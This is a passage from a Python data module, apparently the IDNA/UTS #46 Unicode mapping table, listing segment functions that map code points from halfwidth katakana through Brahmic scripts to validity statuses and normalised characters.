\'\xe3\x82\xa9\'),\n    (0xFF6C, \'M\', \'\xe3\x83\xa3\'),\n    (0xFF6D, \'M\', \'\xe3\x83\xa5\'),\n    (0xFF6E, \'M\', \'\xe3\x83\xa7\'),\n    (0xFF6F, \'M\', \'\xe3\x83\x83\'),\n    (0xFF70, \'M\', \'\xe3\x83\xbc\'),\n    (0xFF71, \'M\', \'\xe3\x82\xa2\'),\n    (0xFF72, \'M\', \'\xe3\x82\xa4\'),\n    (0xFF73, \'M\', \'\xe3\x82\xa6\'),\n    (0xFF74, \'M\', \'\xe3\x82\xa8\'),\n    (0xFF75, \'M\', \'\xe3\x82\xaa\'),\n    (0xFF76, \'M\', \'\xe3\x82\xab\'),\n    (0xFF77, \'M\', \'\xe3\x82\xad\'),\n    (0xFF78, \'M\', \'\xe3\x82\xaf\'),\n    (0xFF79, \'M\', \'\xe3\x82\xb1\'),\n    (0xFF7A, \'M\', \'\xe3\x82\xb3\'),\n    (0xFF7B, \'M\', \'\xe3\x82\xb5\'),\n    (0xFF7C, \'M\', \'\xe3\x82\xb7\'),\n    (0xFF7D, \'M\', \'\xe3\x82\xb9\'),\n    (0xFF7E, \'M\', \'\xe3\x82\xbb\'),\n    ]\n\ndef _seg_52() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFF7F, \'M\', \'\xe3\x82\xbd\'),\n    (0xFF80, \'M\', \'\xe3\x82\xbf\'),\n    (0xFF81, \'M\', \'\xe3\x83\x81\'),\n    (0xFF82, \'M\', \'\xe3\x83\x84\'),\n    (0xFF83, \'M\', \'\xe3\x83\x86\'),\n    (0xFF84, \'M\', \'\xe3\x83\x88\'),\n    (0xFF85, \'M\', \'\xe3\x83\x8a\'),\n    (0xFF86, \'M\', \'\xe3\x83\x8b\'),\n    (0xFF87, \'M\', \'\xe3\x83\x8c\'),\n    (0xFF88, \'M\', \'\xe3\x83\x8d\'),\n    (0xFF89, \'M\', \'\xe3\x83\x8e\'),\n    (0xFF8A, \'M\', \'\xe3\x83\x8f\'),\n    (0xFF8B, \'M\', \'\xe3\x83\x92\'),\n    (0xFF8C, \'M\', \'\xe3\x83\x95\'),\n    (0xFF8D, \'M\', \'\xe3\x83\x98\'),\n    (0xFF8E, \'M\', \'\xe3\x83\x9b\'),\n    (0xFF8F, \'M\', \'\xe3\x83\x9e\'),\n    (0xFF90, \'M\', \'\xe3\x83\x9f\'),\n    (0xFF91, \'M\', \'\xe3\x83\xa0\'),\n    (0xFF92, \'M\', \'\xe3\x83\xa1\'),\n    (0xFF93, \'M\', \'\xe3\x83\xa2\'),\n    (0xFF94, \'M\', \'\xe3\x83\xa4\'),\n    (0xFF95, \'M\', \'\xe3\x83\xa6\'),\n    (0xFF96, \'M\', \'\xe3\x83\xa8\'),\n    (0xFF97, \'M\', \'\xe3\x83\xa9\'),\n    (0xFF98, \'M\', \'\xe3\x83\xaa\'),\n    (0xFF99, \'M\', \'\xe3\x83\xab\'),\n    (0xFF9A, \'M\', \'\xe3\x83\xac\'),\n    (0xFF9B, \'M\', \'\xe3\x83\xad\'),\n    (0xFF9C, \'M\', \'\xe3\x83\xaf\'),\n    (0xFF9D, \'M\', \'\xe3\x83\xb3\'),\n    (0xFF9E, \'M\', \'\xe3\x82\x99\'),\n    (0xFF9F, \'M\', \'\xe3\x82\x9a\'),\n    (0xFFA0, \'X\'),\n    (0xFFA1, \'M\', \'\xe1\x84\x80\'),\n    (0xFFA2, \'M\', \'\xe1\x84\x81\'),\n    (0xFFA3, \'M\', \'\xe1\x86\xaa\'),\n    (0xFFA4, \'M\', \'\xe1\x84\x82\'),\n    (0xFFA5, \'M\', \'\xe1\x86\xac\'),\n    (0xFFA6, \'M\', \'\xe1\x86\xad\'),\n    (0xFFA7, \'M\', \'\xe1\x84\x83\'),\n    (0xFFA8, \'M\', \'\xe1\x84\x84\'),\n    (0xFFA9, \'M\', \'\xe1\x84\x85\'),\n    (0xFFAA, \'M\', \'\xe1\x86\xb0\'),\n    (0xFFAB, \'M\', \'\xe1\x86\xb1\'),\n    (0xFFAC, \'M\', \'\xe1\x86\xb2\'),\n    (0xFFAD, \'M\', \'\xe1\x86\xb3\'),\n    (0xFFAE, \'M\', \'\xe1\x86\xb4\'),\n    (0xFFAF, \'M\', \'\xe1\x86\xb5\'),\n    (0xFFB0, \'M\', \'\xe1\x84\x9a\'),\n    (0xFFB1, \'M\', \'\xe1\x84\x86\'),\n    (0xFFB2, \'M\', \'\xe1\x84\x87\'),\n    (0xFFB3, \'M\', \'\xe1\x84\x88\'),\n    (0xFFB4, \'M\', \'\xe1\x84\xa1\'),\n    (0xFFB5, \'M\', \'\xe1\x84\x89\'),\n    (0xFFB6, \'M\', \'\xe1\x84\x8a\'),\n    (0xFFB7, \'M\', \'\xe1\x84\x8b\'),\n    (0xFFB8, \'M\', \'\xe1\x84\x8c\'),\n    (0xFFB9, \'M\', \'\xe1\x84\x8d\'),\n    (0xFFBA, \'M\', \'\xe1\x84\x8e\'),\n    (0xFFBB, \'M\', \'\xe1\x84\x8f\'),\n    (0xFFBC, \'M\', \'\xe1\x84\x90\'),\n    (0xFFBD, \'M\', \'\xe1\x84\x91\'),\n    (0xFFBE, \'M\', \'\xe1\x84\x92\'),\n    (0xFFBF, \'X\'),\n    (0xFFC2, \'M\', \'\xe1\x85\xa1\'),\n    (0xFFC3, \'M\', \'\xe1\x85\xa2\'),\n    (0xFFC4, \'M\', \'\xe1\x85\xa3\'),\n    (0xFFC5, \'M\', \'\xe1\x85\xa4\'),\n    (0xFFC6, \'M\', \'\xe1\x85\xa5\'),\n    (0xFFC7, \'M\', \'\xe1\x85\xa6\'),\n    (0xFFC8, \'X\'),\n    (0xFFCA, \'M\', \'\xe1\x85\xa7\'),\n    (0xFFCB, \'M\', \'\xe1\x85\xa8\'),\n    (0xFFCC, \'M\', \'\xe1\x85\xa9\'),\n    (0xFFCD, \'M\', \'\xe1\x85\xaa\'),\n    (0xFFCE, \'M\', \'\xe1\x85\xab\'),\n    (0xFFCF, \'M\', \'\xe1\x85\xac\'),\n    (0xFFD0, \'X\'),\n    (0xFFD2, \'M\', \'\xe1\x85\xad\'),\n    (0xFFD3, \'M\', \'\xe1\x85\xae\'),\n    (0xFFD4, \'M\', \'\xe1\x85\xaf\'),\n    (0xFFD5, \'M\', \'\xe1\x85\xb0\'),\n    (0xFFD6, \'M\', \'\xe1\x85\xb1\'),\n    (0xFFD7, \'M\', \'\xe1\x85\xb2\'),\n    (0xFFD8, \'X\'),\n    (0xFFDA, \'M\', \'\xe1\x85\xb3\'),\n    (0xFFDB, \'M\', \'\xe1\x85\xb4\'),\n    (0xFFDC, \'M\', \'\xe1\x85\xb5\'),\n    (0xFFDD, \'X\'),\n    (0xFFE0, \'M\', \'\xc2\xa2\'),\n    (0xFFE1, \'M\', \'\xc2\xa3\'),\n    (0xFFE2, \'M\', \'\xc2\xac\'),\n    (0xFFE3, \'3\', \' \xcc\x84\'),\n    (0xFFE4, \'M\', \'\xc2\xa6\'),\n    (0xFFE5, \'M\', \'\xc2\xa5\'),\n    (0xFFE6, \'M\', \'\xe2\x82\xa9\'),\n    (0xFFE7, \'X\'),\n    (0xFFE8, \'M\', \'\xe2\x94\x82\'),\n    (0xFFE9, \'M\', \'\xe2\x86\x90\'),\n    ]\n\ndef _seg_53() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xFFEA, \'M\', \'\xe2\x86\x91\'),\n    (0xFFEB, \'M\', \'\xe2\x86\x92\'),\n    (0xFFEC, \'M\', \'\xe2\x86\x93\'),\n    (0xFFED, \'M\', \'\xe2\x96\xa0\'),\n    (0xFFEE, \'M\', \'\xe2\x97\x8b\'),\n    (0xFFEF, \'X\'),\n    (0x10000, \'V\'),\n    (0x1000C, \'X\'),\n    (0x1000D, \'V\'),\n    (0x10027, \'X\'),\n    (0x10028, \'V\'),\n    (0x1003B, \'X\'),\n    (0x1003C, \'V\'),\n    (0x1003E, \'X\'),\n    (0x1003F, \'V\'),\n    (0x1004E, \'X\'),\n    (0x10050, \'V\'),\n    (0x1005E, \'X\'),\n    (0x10080, \'V\'),\n    (0x100FB, \'X\'),\n    (0x10100, \'V\'),\n    (0x10103, \'X\'),\n    (0x10107, \'V\'),\n    (0x10134, \'X\'),\n    (0x10137, \'V\'),\n    (0x1018F, \'X\'),\n    (0x10190, \'V\'),\n    (0x1019D, \'X\'),\n    (0x101A0, \'V\'),\n    (0x101A1, \'X\'),\n    (0x101D0, \'V\'),\n    (0x101FE, \'X\'),\n    (0x10280, \'V\'),\n    (0x1029D, \'X\'),\n    (0x102A0, \'V\'),\n    (0x102D1, \'X\'),\n    (0x102E0, \'V\'),\n    (0x102FC, \'X\'),\n    (0x10300, \'V\'),\n    (0x10324, \'X\'),\n    (0x1032D, \'V\'),\n    (0x1034B, \'X\'),\n    (0x10350, \'V\'),\n    (0x1037B, \'X\'),\n    (0x10380, \'V\'),\n    (0x1039E, \'X\'),\n    (0x1039F, \'V\'),\n    (0x103C4, \'X\'),\n    (0x103C8, \'V\'),\n    (0x103D6, \'X\'),\n    (0x10400, \'M\', \'\xf0\x90\x90\xa8\'),\n    (0x10401, \'M\', \'\xf0\x90\x90\xa9\'),\n    (0x10402, \'M\', \'\xf0\x90\x90\xaa\'),\n    (0x10403, \'M\', \'\xf0\x90\x90\xab\'),\n    (0x10404, \'M\', \'\xf0\x90\x90\xac\'),\n    (0x10405, \'M\', \'\xf0\x90\x90\xad\'),\n    (0x10406, \'M\', \'\xf0\x90\x90\xae\'),\n    (0x10407, \'M\', \'\xf0\x90\x90\xaf\'),\n    (0x10408, \'M\', \'\xf0\x90\x90\xb0\'),\n    (0x10409, \'M\', \'\xf0\x90\x90\xb1\'),\n    (0x1040A, \'M\', \'\xf0\x90\x90\xb2\'),\n    (0x1040B, \'M\', \'\xf0\x90\x90\xb3\'),\n    (0x1040C, \'M\', \'\xf0\x90\x90\xb4\'),\n    (0x1040D, \'M\', \'\xf0\x90\x90\xb5\'),\n    (0x1040E, \'M\', \'\xf0\x90\x90\xb6\'),\n    (0x1040F, \'M\', \'\xf0\x90\x90\xb7\'),\n    (0x10410, \'M\', \'\xf0\x90\x90\xb8\'),\n    (0x10411, \'M\', \'\xf0\x90\x90\xb9\'),\n    (0x10412, \'M\', \'\xf0\x90\x90\xba\'),\n    (0x10413, \'M\', \'\xf0\x90\x90\xbb\'),\n    (0x10414, \'M\', \'\xf0\x90\x90\xbc\'),\n    (0x10415, \'M\', \'\xf0\x90\x90\xbd\'),\n    (0x10416, \'M\', \'\xf0\x90\x90\xbe\'),\n    (0x10417, \'M\', \'\xf0\x90\x90\xbf\'),\n    (0x10418, \'M\', \'\xf0\x90\x91\x80\'),\n    (0x10419, \'M\', \'\xf0\x90\x91\x81\'),\n    (0x1041A, \'M\', \'\xf0\x90\x91\x82\'),\n    (0x1041B, \'M\', \'\xf0\x90\x91\x83\'),\n    (0x1041C, \'M\', \'\xf0\x90\x91\x84\'),\n    (0x1041D, \'M\', \'\xf0\x90\x91\x85\'),\n    (0x1041E, \'M\', \'\xf0\x90\x91\x86\'),\n    (0x1041F, \'M\', \'\xf0\x90\x91\x87\'),\n    (0x10420, \'M\', \'\xf0\x90\x91\x88\'),\n    (0x10421, \'M\', \'\xf0\x90\x91\x89\'),\n    (0x10422, \'M\', \'\xf0\x90\x91\x8a\'),\n    (0x10423, \'M\', \'\xf0\x90\x91\x8b\'),\n    (0x10424, \'M\', \'\xf0\x90\x91\x8c\'),\n    (0x10425, \'M\', \'\xf0\x90\x91\x8d\'),\n    (0x10426, \'M\', \'\xf0\x90\x91\x8e\'),\n    (0x10427, \'M\', \'\xf0\x90\x91\x8f\'),\n    (0x10428, \'V\'),\n    (0x1049E, \'X\'),\n    (0x104A0, \'V\'),\n    (0x104AA, \'X\'),\n    (0x104B0, \'M\', \'\xf0\x90\x93\x98\'),\n    (0x104B1, \'M\', \'\xf0\x90\x93\x99\'),\n    (0x104B2, \'M\', \'\xf0\x90\x93\x9a\'),\n    (0x104B3, \'M\', \'\xf0\x90\x93\x9b\'),\n    (0x104B4, \'M\', \'\xf0\x90\x93\x9c\'),\n    (0x104B5, \'M\', \'\xf0\x90\x93\x9d\'),\n    ]\n\ndef _seg_54() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x104B6, \'M\', \'\xf0\x90\x93\x9e\'),\n    (0x104B7, \'M\', \'\xf0\x90\x93\x9f\'),\n    (0x104B8, \'M\', \'\xf0\x90\x93\xa0\'),\n    (0x104B9, \'M\', \'\xf0\x90\x93\xa1\'),\n    (0x104BA, \'M\', \'\xf0\x90\x93\xa2\'),\n    (0x104BB, \'M\', \'\xf0\x90\x93\xa3\'),\n    (0x104BC, \'M\', \'\xf0\x90\x93\xa4\'),\n    (0x104BD, \'M\', \'\xf0\x90\x93\xa5\'),\n    (0x104BE, \'M\', \'\xf0\x90\x93\xa6\'),\n    (0x104BF, \'M\', \'\xf0\x90\x93\xa7\'),\n    (0x104C0, \'M\', \'\xf0\x90\x93\xa8\'),\n    (0x104C1, \'M\', \'\xf0\x90\x93\xa9\'),\n    (0x104C2, \'M\', \'\xf0\x90\x93\xaa\'),\n    (0x104C3, \'M\', \'\xf0\x90\x93\xab\'),\n    (0x104C4, \'M\', \'\xf0\x90\x93\xac\'),\n    (0x104C5, \'M\', \'\xf0\x90\x93\xad\'),\n    (0x104C6, \'M\', \'\xf0\x90\x93\xae\'),\n    (0x104C7, \'M\', \'\xf0\x90\x93\xaf\'),\n    (0x104C8, \'M\', \'\xf0\x90\x93\xb0\'),\n    (0x104C9, \'M\', \'\xf0\x90\x93\xb1\'),\n    (0x104CA, \'M\', \'\xf0\x90\x93\xb2\'),\n    (0x104CB, \'M\', \'\xf0\x90\x93\xb3\'),\n    (0x104CC, \'M\', \'\xf0\x90\x93\xb4\'),\n    (0x104CD, \'M\', \'\xf0\x90\x93\xb5\'),\n    (0x104CE, \'M\', \'\xf0\x90\x93\xb6\'),\n    (0x104CF, \'M\', \'\xf0\x90\x93\xb7\'),\n    (0x104D0, \'M\', \'\xf0\x90\x93\xb8\'),\n    (0x104D1, \'M\', \'\xf0\x90\x93\xb9\'),\n    (0x104D2, \'M\', \'\xf0\x90\x93\xba\'),\n    (0x104D3, \'M\', \'\xf0\x90\x93\xbb\'),\n    (0x104D4, \'X\'),\n    (0x104D8, \'V\'),\n    (0x104FC, \'X\'),\n    (0x10500, \'V\'),\n    (0x10528, \'X\'),\n    (0x10530, \'V\'),\n    (0x10564, \'X\'),\n    (0x1056F, \'V\'),\n    (0x10570, \'M\', \'\xf0\x90\x96\x97\'),\n    (0x10571, \'M\', \'\xf0\x90\x96\x98\'),\n    (0x10572, \'M\', \'\xf0\x90\x96\x99\'),\n    (0x10573, \'M\', \'\xf0\x90\x96\x9a\'),\n    (0x10574, \'M\', \'\xf0\x90\x96\x9b\'),\n    (0x10575, \'M\', \'\xf0\x90\x96\x9c\'),\n    (0x10576, \'M\', \'\xf0\x90\x96\x9d\'),\n    (0x10577, \'M\', \'\xf0\x90\x96\x9e\'),\n    (0x10578, \'M\', \'\xf0\x90\x96\x9f\'),\n    (0x10579, \'M\', \'\xf0\x90\x96\xa0\'),\n    (0x1057A, \'M\', \'\xf0\x90\x96\xa1\'),\n    (0x1057B, \'X\'),\n    (0x1057C, \'M\', \'\xf0\x90\x96\xa3\'),\n    (0x1057D, \'M\', \'\xf0\x90\x96\xa4\'),\n    (0x1057E, \'M\', \'\xf0\x90\x96\xa5\'),\n    (0x1057F, \'M\', \'\xf0\x90\x96\xa6\'),\n    (0x10580, \'M\', \'\xf0\x90\x96\xa7\'),\n    (0x10581, \'M\', \'\xf0\x90\x96\xa8\'),\n    (0x10582, \'M\', \'\xf0\x90\x96\xa9\'),\n    (0x10583, \'M\', \'\xf0\x90\x96\xaa\'),\n    (0x10584, \'M\', \'\xf0\x90\x96\xab\'),\n    (0x10585, \'M\', \'\xf0\x90\x96\xac\'),\n    (0x10586, \'M\', \'\xf0\x90\x96\xad\'),\n    (0x10587, \'M\', \'\xf0\x90\x96\xae\'),\n    (0x10588, \'M\', \'\xf0\x90\x96\xaf\'),\n    (0x10589, \'M\', \'\xf0\x90\x96\xb0\'),\n    (0x1058A, \'M\', \'\xf0\x90\x96\xb1\'),\n    (0x1058B, \'X\'),\n    (0x1058C, \'M\', \'\xf0\x90\x96\xb3\'),\n    (0x1058D, \'M\', \'\xf0\x90\x96\xb4\'),\n    (0x1058E, \'M\', \'\xf0\x90\x96\xb5\'),\n    (0x1058F, \'M\', \'\xf0\x90\x96\xb6\'),\n    (0x10590, \'M\', \'\xf0\x90\x96\xb7\'),\n    (0x10591, \'M\', \'\xf0\x90\x96\xb8\'),\n    (0x10592, \'M\', \'\xf0\x90\x96\xb9\'),\n    (0x10593, \'X\'),\n    (0x10594, \'M\', \'\xf0\x90\x96\xbb\'),\n    (0x10595, \'M\', \'\xf0\x90\x96\xbc\'),\n    (0x10596, \'X\'),\n    (0x10597, \'V\'),\n    (0x105A2, \'X\'),\n    (0x105A3, \'V\'),\n    (0x105B2, \'X\'),\n    (0x105B3, \'V\'),\n    (0x105BA, \'X\'),\n    (0x105BB, \'V\'),\n    (0x105BD, \'X\'),\n    (0x10600, \'V\'),\n    (0x10737, \'X\'),\n    (0x10740, \'V\'),\n    (0x10756, \'X\'),\n    (0x10760, \'V\'),\n    (0x10768, \'X\'),\n    (0x10780, \'V\'),\n    (0x10781, \'M\', \'\xcb\x90\'),\n    (0x10782, \'M\', \'\xcb\x91\'),\n    (0x10783, \'M\', \'\xc3\xa6\'),\n    (0x10784, \'M\', \'\xca\x99\'),\n    (0x10785, \'M\', \'\xc9\x93\'),\n    (0x10786, \'X\'),\n    (0x10787, \'M\', \'\xca\xa3\'),\n    (0x10788, \'M\', \'\xea\xad\xa6\'),\n    ]\n\ndef _seg_55() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x10789, \'M\', \'\xca\xa5\'),\n    (0x1078A, \'M\', \'\xca\xa4\'),\n    (0x1078B, \'M\', \'\xc9\x96\'),\n    (0x1078C, \'M\', \'\xc9\x97\'),\n    (0x1078D, \'M\', \'\xe1\xb6\x91\'),\n    (0x1078E, \'M\', \'\xc9\x98\'),\n    (0x1078F, \'M\', \'\xc9\x9e\'),\n    (0x10790, \'M\', \'\xca\xa9\'),\n    (0x10791, \'M\', \'\xc9\xa4\'),\n    (0x10792, \'M\', \'\xc9\xa2\'),\n    (0x10793, \'M\', \'\xc9\xa0\'),\n    (0x10794, \'M\', \'\xca\x9b\'),\n    (0x10795, \'M\', \'\xc4\xa7\'),\n    (0x10796, \'M\', \'\xca\x9c\'),\n    (0x10797, \'M\', \'\xc9\xa7\'),\n    (0x10798, \'M\', \'\xca\x84\'),\n    (0x10799, \'M\', \'\xca\xaa\'),\n    (0x1079A, \'M\', \'\xca\xab\'),\n    (0x1079B, \'M\', \'\xc9\xac\'),\n    (0x1079C, \'M\', \'\xf0\x9d\xbc\x84\'),\n    (0x1079D, \'M\', \'\xea\x9e\x8e\'),\n    (0x1079E, \'M\', \'\xc9\xae\'),\n    (0x1079F, \'M\', \'\xf0\x9d\xbc\x85\'),\n    (0x107A0, \'M\', \'\xca\x8e\'),\n    (0x107A1, \'M\', \'\xf0\x9d\xbc\x86\'),\n    (0x107A2, \'M\', \'\xc3\xb8\'),\n    (0x107A3, \'M\', \'\xc9\xb6\'),\n    (0x107A4, \'M\', \'\xc9\xb7\'),\n    (0x107A5, \'M\', \'q\'),\n    (0x107A6, \'M\', \'\xc9\xba\'),\n    (0x107A7, \'M\', \'\xf0\x9d\xbc\x88\'),\n    (0x107A8, \'M\', \'\xc9\xbd\'),\n    (0x107A9, \'M\', \'\xc9\xbe\'),\n    (0x107AA, \'M\', \'\xca\x80\'),\n    (0x107AB, \'M\', \'\xca\xa8\'),\n    (0x107AC, \'M\', \'\xca\xa6\'),\n    (0x107AD, \'M\', \'\xea\xad\xa7\'),\n    (0x107AE, \'M\', \'\xca\xa7\'),\n    (0x107AF, \'M\', \'\xca\x88\'),\n    (0x107B0, \'M\', \'\xe2\xb1\xb1\'),\n    (0x107B1, \'X\'),\n    (0x107B2, \'M\', \'\xca\x8f\'),\n    (0x107B3, \'M\', \'\xca\xa1\'),\n    (0x107B4, \'M\', \'\xca\xa2\'),\n    (0x107B5, \'M\', \'\xca\x98\'),\n    (0x107B6, \'M\', \'\xc7\x80\'),\n    (0x107B7, \'M\', \'\xc7\x81\'),\n    (0x107B8, \'M\', \'\xc7\x82\'),\n    (0x107B9, \'M\', \'\xf0\x9d\xbc\x8a\'),\n    (0x107BA, \'M\', \'\xf0\x9d\xbc\x9e\'),\n    (0x107BB, \'X\'),\n    (0x10800, \'V\'),\n    (0x10806, \'X\'),\n    (0x10808, \'V\'),\n    (0x10809, \'X\'),\n    (0x1080A, \'V\'),\n    (0x10836, \'X\'),\n    (0x10837, \'V\'),\n    (0x10839, \'X\'),\n    (0x1083C, \'V\'),\n    (0x1083D, \'X\'),\n    (0x1083F, \'V\'),\n    (0x10856, \'X\'),\n    (0x10857, \'V\'),\n    (0x1089F, \'X\'),\n    (0x108A7, \'V\'),\n    (0x108B0, \'X\'),\n    (0x108E0, \'V\'),\n    (0x108F3, \'X\'),\n    (0x108F4, \'V\'),\n    (0x108F6, \'X\'),\n    (0x108FB, \'V\'),\n    (0x1091C, \'X\'),\n    (0x1091F, \'V\'),\n    (0x1093A, \'X\'),\n    (0x1093F, \'V\'),\n    (0x10940, \'X\'),\n    (0x10980, \'V\'),\n    (0x109B8, \'X\'),\n    (0x109BC, \'V\'),\n    (0x109D0, \'X\'),\n    (0x109D2, \'V\'),\n    (0x10A04, \'X\'),\n    (0x10A05, \'V\'),\n    (0x10A07, \'X\'),\n    (0x10A0C, \'V\'),\n    (0x10A14, \'X\'),\n    (0x10A15, \'V\'),\n    (0x10A18, \'X\'),\n    (0x10A19, \'V\'),\n    (0x10A36, \'X\'),\n    (0x10A38, \'V\'),\n    (0x10A3B, \'X\'),\n    (0x10A3F, \'V\'),\n    (0x10A49, \'X\'),\n    (0x10A50, \'V\'),\n    (0x10A59, \'X\'),\n    (0x10A60, \'V\'),\n    (0x10AA0, \'X\'),\n    (0x10AC0, \'V\'),\n    ]\n\ndef _seg_56() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x10AE7, \'X\'),\n    (0x10AEB, \'V\'),\n    (0x10AF7, \'X\'),\n    (0x10B00, \'V\'),\n    (0x10B36, \'X\'),\n    (0x10B39, \'V\'),\n    (0x10B56, \'X\'),\n    (0x10B58, \'V\'),\n    (0x10B73, \'X\'),\n    (0x10B78, \'V\'),\n    (0x10B92, \'X\'),\n    (0x10B99, \'V\'),\n    (0x10B9D, \'X\'),\n    (0x10BA9, \'V\'),\n    (0x10BB0, \'X\'),\n    (0x10C00, \'V\'),\n    (0x10C49, \'X\'),\n    (0x10C80, \'M\', \'\xf0\x90\xb3\x80\'),\n    (0x10C81, \'M\', \'\xf0\x90\xb3\x81\'),\n    (0x10C82, \'M\', \'\xf0\x90\xb3\x82\'),\n    (0x10C83, \'M\', \'\xf0\x90\xb3\x83\'),\n    (0x10C84, \'M\', \'\xf0\x90\xb3\x84\'),\n    (0x10C85, \'M\', \'\xf0\x90\xb3\x85\'),\n    (0x10C86, \'M\', \'\xf0\x90\xb3\x86\'),\n    (0x10C87, \'M\', \'\xf0\x90\xb3\x87\'),\n    (0x10C88, \'M\', \'\xf0\x90\xb3\x88\'),\n    (0x10C89, \'M\', \'\xf0\x90\xb3\x89\'),\n    (0x10C8A, \'M\', \'\xf0\x90\xb3\x8a\'),\n    (0x10C8B, \'M\', \'\xf0\x90\xb3\x8b\'),\n    (0x10C8C, \'M\', \'\xf0\x90\xb3\x8c\'),\n    (0x10C8D, \'M\', \'\xf0\x90\xb3\x8d\'),\n    (0x10C8E, \'M\', \'\xf0\x90\xb3\x8e\'),\n    (0x10C8F, \'M\', \'\xf0\x90\xb3\x8f\'),\n    (0x10C90, \'M\', \'\xf0\x90\xb3\x90\'),\n    (0x10C91, \'M\', \'\xf0\x90\xb3\x91\'),\n    (0x10C92, \'M\', \'\xf0\x90\xb3\x92\'),\n    (0x10C93, \'M\', \'\xf0\x90\xb3\x93\'),\n    (0x10C94, \'M\', \'\xf0\x90\xb3\x94\'),\n    (0x10C95, \'M\', \'\xf0\x90\xb3\x95\'),\n    (0x10C96, \'M\', \'\xf0\x90\xb3\x96\'),\n    (0x10C97, \'M\', \'\xf0\x90\xb3\x97\'),\n    (0x10C98, \'M\', \'\xf0\x90\xb3\x98\'),\n    (0x10C99, \'M\', \'\xf0\x90\xb3\x99\'),\n    (0x10C9A, \'M\', \'\xf0\x90\xb3\x9a\'),\n    (0x10C9B, \'M\', \'\xf0\x90\xb3\x9b\'),\n    (0x10C9C, \'M\', \'\xf0\x90\xb3\x9c\'),\n    (0x10C9D, \'M\', \'\xf0\x90\xb3\x9d\'),\n    (0x10C9E, \'M\', \'\xf0\x90\xb3\x9e\'),\n    (0x10C9F, \'M\', \'\xf0\x90\xb3\x9f\'),\n    (0x10CA0, \'M\', \'\xf0\x90\xb3\xa0\'),\n    (0x10CA1, \'M\', \'\xf0\x90\xb3\xa1\'),\n    (0x10CA2, \'M\', \'\xf0\x90\xb3\xa2\'),\n    (0x10CA3, \'M\', \'\xf0\x90\xb3\xa3\'),\n    (0x10CA4, \'M\', \'\xf0\x90\xb3\xa4\'),\n    (0x10CA5, \'M\', \'\xf0\x90\xb3\xa5\'),\n    (0x10CA6, \'M\', \'\xf0\x90\xb3\xa6\'),\n    (0x10CA7, \'M\', \'\xf0\x90\xb3\xa7\'),\n    (0x10CA8, \'M\', \'\xf0\x90\xb3\xa8\'),\n    (0x10CA9, \'M\', \'\xf0\x90\xb3\xa9\'),\n    (0x10CAA, \'M\', \'\xf0\x90\xb3\xaa\'),\n    (0x10CAB, \'M\', \'\xf0\x90\xb3\xab\'),\n    (0x10CAC, \'M\', \'\xf0\x90\xb3\xac\'),\n    (0x10CAD, \'M\', \'\xf0\x90\xb3\xad\'),\n    (0x10CAE, \'M\', \'\xf0\x90\xb3\xae\'),\n    (0x10CAF, \'M\', \'\xf0\x90\xb3\xaf\'),\n    (0x10CB0, \'M\', \'\xf0\x90\xb3\xb0\'),\n    (0x10CB1, \'M\', \'\xf0\x90\xb3\xb1\'),\n    (0x10CB2, \'M\', \'\xf0\x90\xb3\xb2\'),\n    (0x10CB3, \'X\'),\n    (0x10CC0, \'V\'),\n    (0x10CF3, \'X\'),\n    (0x10CFA, \'V\'),\n    (0x10D28, \'X\'),\n    (0x10D30, \'V\'),\n    (0x10D3A, \'X\'),\n    (0x10E60, \'V\'),\n    (0x10E7F, \'X\'),\n    (0x10E80, \'V\'),\n    (0x10EAA, \'X\'),\n    (0x10EAB, \'V\'),\n    (0x10EAE, \'X\'),\n    (0x10EB0, \'V\'),\n    (0x10EB2, \'X\'),\n    (0x10F00, \'V\'),\n    (0x10F28, \'X\'),\n    (0x10F30, \'V\'),\n    (0x10F5A, \'X\'),\n    (0x10F70, \'V\'),\n    (0x10F8A, \'X\'),\n    (0x10FB0, \'V\'),\n    (0x10FCC, \'X\'),\n    (0x10FE0, \'V\'),\n    (0x10FF7, \'X\'),\n    (0x11000, \'V\'),\n    (0x1104E, \'X\'),\n    (0x11052, \'V\'),\n    (0x11076, \'X\'),\n    (0x1107F, \'V\'),\n    (0x110BD, \'X\'),\n    (0x110BE, \'V\'),\n    ]\n\ndef _seg_57() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x110C3, \'X\'),\n    (0x110D0, \'V\'),\n    (0x110E9, \'X\'),\n    (0x110F0, \'V\'),\n    (0x110FA, \'X\'),\n    (0x11100, \'V\'),\n    (0x11135, \'X\'),\n    (0x11136, \'V\'),\n    (0x11148, \'X\'),\n    (0x11150, \'V\'),\n    (0x11177, \'X\'),\n    (0x11180, \'V\'),\n    (0x111E0, \'X\'),\n    (0x111E1, \'V\'),\n    (0x111F5, \'X\'),\n    (0x11200, \'V\'),\n    (0x11212, \'X\'),\n    (0x11213, \'V\'),\n    (0x1123F, \'X\'),\n    (0x11280, \'V\'),\n    (0x11287, \'X\'),\n    (0x11288, \'V\'),\n    (0x11289, \'X\'),\n    (0x1128A, \'V\'),\n    (0x1128E, \'X\'),\n    (0x1128F, \'V\'),\n    (0x1129E, \'X\'),\n    (0x1129F, \'V\'),\n    (0x112AA, \'X\'),\n    (0x112B0, \'V\'),\n    (0x112EB, \'X\'),\n    (0x112F0, \'V\'),\n    (0x112FA, \'X\'),\n    (0x11300, \'V\'),\n    (0x11304, \'X\'),\n    (0x11305, \'V\'),\n    (0x1130D, \'X\'),\n    (0x1130F, \'V\'),\n    (0x11311, \'X\'),\n    (0x11313, \'V\'),\n    (0x11329, \'X\'),\n    (0x1132A, \'V\'),\n    (0x11331, \'X\'),\n    (0x11332, \'V\'),\n    (0x11334, \'X\'),\n    (0x11335, \'V\'),\n    (0x1133A, \'X\'),\n    (0x1133B, \'V\'),\n    (0x11345, \'X\'),\n    (0x11347, \'V\'),\n    (0x11349, \'X\'),\n    (0x1134B, \'V\'),\n    (0x1134E, \'X\'),\n    (0x11350, \'V\'),\n    (0x11351, \'X\'),\n    (0x11357, \'V\'),\n    (0x11358, \'X\'),\n    (0x1135D, \'V\'),\n    (0x11364, \'X\'),\n    (0x11366, \'V\'),\n    (0x1136D, \'X\'),\n    (0x11370, \'V\'),\n    (0x11375, \'X\'),\n    (0x11400, \'V\'),\n    (0x1145C, \'X\'),\n    (0x1145D, \'V\'),\n    (0x11462, 